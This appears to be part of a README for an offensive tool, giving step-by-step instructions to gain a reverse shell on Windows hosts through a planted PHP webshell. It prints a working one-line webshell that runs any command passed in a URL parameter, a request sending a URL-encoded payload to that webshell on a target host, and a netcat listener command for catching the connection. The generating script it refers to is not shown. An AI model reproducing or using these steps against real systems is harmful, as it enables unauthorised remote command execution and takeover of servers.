
### 1. **Set Up a Webshell on the Target**

Ensure the target has a vulnerable PHP webshell that can execute commands through a URL parameter. Example:

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

This PHP script will execute commands passed in the `cmd` URL parameter.

### 2. **Adjust IP and Port in the Payload**

Modify the reverse shell payload to use your **attacker's IP** (`LHOST`) and **chosen port** (`LPORT`).


After running the script, you'll get the **URL-encoded** payload.

### 3. **Execute the Payload via Webshell**

Once the payload is URL-encoded, execute it via the vulnerable webshell:

```bash
http://target.com/uploads/example.php?cmd=ENCODED_PAYLOAD
```

### 4. **Start Netcat Listener**

Before triggering the reverse shell, set up a listener on your attacking machine using Netcat:

```bash
nc -lvnp 4444

## TARGET:
- **Windows Hosts** (Tested on Windows 10 and Windows Server)

